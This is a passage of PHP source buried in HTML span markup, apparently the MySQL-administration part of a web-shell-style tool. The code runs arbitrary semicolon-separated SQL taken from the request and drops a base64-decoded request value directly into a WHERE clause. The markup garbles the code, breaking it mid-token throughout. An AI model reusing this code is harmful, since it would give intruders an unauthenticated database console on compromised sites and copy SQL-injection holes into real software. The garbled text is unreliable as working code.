&amp;raquo;&lt;/h2<span style=\"text-decoration: underline;\">&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $where = base64_decode($base64);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $result = q(\"SELECT * FROM $tablename WHERE $where LIMIT<span style=\"text-decoration: underline;\"> 1\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rs = mysql_fetch_array($result);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;form method=\"post\" action=\"'.$self.'\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p($dbform);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','mysqladmin');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('tablename',$tablename);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach ($rowdb as $row) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($rs[$row['Field']]) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $value = htmlspecialchars($rs[$row['Field']]);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $value = '';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $thisbg = bg();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\<span style=\"text-decoration: underline;\">'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\"&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_incre<span style=\"text-decoration: underline;\">ment' || $row['Key'] == 'PRI') {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].<span style=\"text-decoration: underline;\">'&lt;/td&gt;&lt;td&gt;'.$value.'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {<span style=\"color: #f99157; background-color: #515151;\">                            </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].<span style=\"text-decoration: underline;\">'&lt;/td&gt;&lt;td&gt;&lt;textarea class=\"area\" name=\"insertsql['.$row['Field'].']\" style=\"width:500px;height:60px;overflow:auto;\"&gt;'.$value.'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($doing == 'insert') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.bg().'\"&gt;&lt;td colspan=\"2\"&gt;&lt;input class=\"bt<span style=\"text-decoration: underline;\">\" type=\"submit\" name=\"insert\" value=\"Insert\" /&gt;&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"'.bg().'\"&gt;&lt;td colspan=\"2\"&gt;&lt;input class=\"bt<span style=\"text-decoration: underline;\">\" type=\"submit\" name=\"update\" value=\"Update\" /&gt;&lt;/td&gt;&lt;/tr&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('base64', $base64);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/table&gt;&lt;/form&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $querys = @explode(';',$sql_query);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach($querys as $num=&gt;$query) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($query) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;p&gt;&lt;b&gt;Query#{$num} : \".htmlspecialchars($query,EN<span style=\"text-decoration: underline;\">T_QUOTES).\"&lt;/b&gt;&lt;/p&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   switch(qy($query))\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   case 0:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Error : '.mysql_error().'&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   break;<span style=\"color: #f99157; background-color: #515151;\">  </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   case 1:\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (strtolower(substr($query,0,13)) == 'sele<span style=\"text-decoration: underline;\">ct * from') {</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $allowedit = 1;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($getnumsql) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tatol = mysql_num_rows(q($getnumsql));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $multipage = multi($tatol, $pagenum, $pa<span style=\"text-decoration: underline;\">ge, $tablename);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$tablename) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $sql_line = str_replace(array(\"\\r\", \"\\n\"<span style=\"text-decoration: underline;\">, \"\\t\"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $sql_line = preg_replace(\"/\\/\\*[^(\\*\\/)]<span style=\"text-decoration: underline;\">*\\*\\//i\", \" \", $sql_line);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   preg_match_all(\"/from\\s+`{0,1}([\\w]+)`{0<span style=\"text-decoration: underline;\">,1}\\s+/i\",$sql_line,$matches);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $tablename = $matches[1][0];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   /*********************/\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $getfield = q(\"SHOW COLUMNS FROM $tablename\"<span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $rowdb = array();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $keyfied = ''; //&#20027;&#38190;&#23383;&#27573;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   while($row = @mysql_fetch_assoc($getfield)) <span style=\"text-decoration: underline;\">{</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   